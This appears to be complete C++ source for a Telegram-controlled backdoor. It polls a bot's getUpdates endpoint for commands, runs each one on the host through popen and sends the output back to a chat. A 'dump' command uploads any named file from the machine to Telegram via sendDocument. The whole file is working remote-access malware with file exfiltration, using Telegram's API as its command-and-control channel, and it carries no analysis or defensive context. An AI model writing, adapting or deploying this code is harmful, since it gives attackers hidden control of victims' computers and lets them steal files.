#include <iostream>
#include <string>
#include <curl/curl.h>
#include <cstdlib>
#include <unistd.h>

using namespace std;

const string BOT_TOKEN = "YOUR BOT TOKEN";
const string CHAT_ID = "YOUR CHAT ID";

void uploader(string cmd);
void sendMessage(const string& text, const string& parseMode);
string getLastCommand();

void uploader(string cmd){

  sendMessage("Uploading file","Markdown");
  string filename = "";

  size_t pos = cmd.rfind(' ');
  if (pos != string::npos) {
    filename = cmd.substr(pos + 1);
  } else {
    filename = cmd;
  }

  CURL *curl = curl_easy_init();
  curl_global_init(CURL_GLOBAL_ALL);
  CURLcode result;
  curl_mime *mime;
  curl_mimepart *part;

  string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

  if (curl) {

    mime = curl_mime_init(curl);

    part = curl_mime_addpart(mime);
    curl_mime_name(part,"chat_id");
    curl_mime_data(part,CHAT_ID.c_str(),CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part,"document");
    curl_mime_filedata(part,filename.c_str());

    curl_easy_setopt(curl,CURLOPT_URL,url.c_str());
    curl_easy_setopt(curl,CURLOPT_MIMEPOST,mime);

    result = curl_easy_perform(curl);
    curl_mime_free(mime);

    if (result != CURLE_OK) {
      sendMessage("Can't upload file","Markdown");
    }

  }

  curl_easy_cleanup(curl);
  curl_global_cleanup();

}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    output->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void sendMessage(const string& text, const string& parseMode = "Markdown") {
  CURL* curl = curl_easy_init();
  if (curl) {
      string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

      string escapedText = curl_easy_escape(curl, text.c_str(), text.length());

      string postFields = "chat_id=" + CHAT_ID +
                            "&text=" + escapedText +
                            "&parse_mode=" + parseMode;

      curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
      curl_easy_perform(curl);
      curl_easy_cleanup(curl);
  }
}

string getLastCommand() {
  CURL* curl = curl_easy_init();
  string readBuffer;

  if (curl) {
      string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates";
      curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
      curl_easy_perform(curl);
      curl_easy_cleanup(curl);
    }

    size_t pos = readBuffer.rfind("\"text\":\"");
    if (pos != string::npos) {
      size_t start = pos + 8;
      size_t end = readBuffer.find("\"", start);
      return readBuffer.substr(start, end - start);
    }

  return "";
}

int main() {
  string lastCommand;
  sendMessage("🔓 Shell bot started!");

  while (true) {
    string cmd = getLastCommand();

    if (cmd.find("dump") != string::npos && cmd != lastCommand) {
      lastCommand = cmd;
      uploader(cmd);
    } else if (!cmd.empty() && cmd != lastCommand) {
      lastCommand = cmd;

      FILE* pipe = popen(cmd.c_str(), "r");
      if (!pipe) {
        sendMessage("❌ Failed to execute command.");
        continue;
      }

      char buffer[128];
      string result;

      while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
      }

      pclose(pipe);

      if (result.empty()) {
        sendMessage("❌ Unknown command");
      } else {
        string rslt = "```bash\n" + result + "```";
        sendMessage(rslt);
      }
    }

    sleep(4);
  }

  return 0;
}
